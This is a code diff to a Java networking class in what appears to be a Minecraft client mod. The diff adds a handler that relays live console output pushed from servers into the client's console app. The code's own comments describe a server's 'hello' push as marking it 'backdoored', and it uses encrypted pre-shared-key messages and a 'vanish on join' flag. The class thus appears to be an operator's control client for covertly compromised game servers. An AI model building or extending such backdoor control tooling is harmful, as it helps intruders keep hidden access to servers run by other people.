@@ -57,6 +57,11 @@ public final class Net {
     private static final AtomicLong sfails = new AtomicLong();
     private static volatile String pskPrefix = "";
 
+    // Live server console pushes (op=console.log). ConsoleApp registers a sink
+    // so pushes land in the app's output even when it was opened later.
+    private static volatile Consumer<String> consoleSink = s -> {};
+    public static void setConsoleSink(Consumer<String> sink) { consoleSink = sink == null ? s -> {} : sink; }
+
     public static void requestVanishOnJoin() { vanishOnJoin = true; }
     public static boolean consumeVanishOnJoin() { boolean v = vanishOnJoin; vanishOnJoin = false; return v; }
 
@@ -186,9 +191,14 @@ public final class Net {
         if (plain == null) { DebugConsole.log("inbound: DECRYPT FAILED on " + cipher.length + " bytes (psk mismatch?)"); return; }
         DebugConsole.log("inbound: decrypted " + plain.length + " bytes");
         JsonObject j = GSON.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class);
-        if (j.has("op")) { // server-initiated push (e.g. "hello" -> this server is backdoored)
+        if (j.has("op")) { // server-initiated push (e.g. "hello" -> this server is backdoored, "console.log" -> live console)
             DebugConsole.log("inbound: push op=" + j.get("op").getAsString());
-            if ("hello".equals(j.get("op").getAsString())) Minecraft.getInstance().execute(Net::registerCurrentServer);
+            String op = j.get("op").getAsString();
+            if ("hello".equals(op)) Minecraft.getInstance().execute(Net::registerCurrentServer);
+            else if ("console.log".equals(op)) {
+                String msg = j.has("msg") ? j.get("msg").getAsString() : "";
+                Minecraft.getInstance().execute(() -> consoleSink.accept(msg));
+            }
             return;
         }
         Consumer<JsonObject> cb = PENDING.remove(j.get("id").getAsInt());
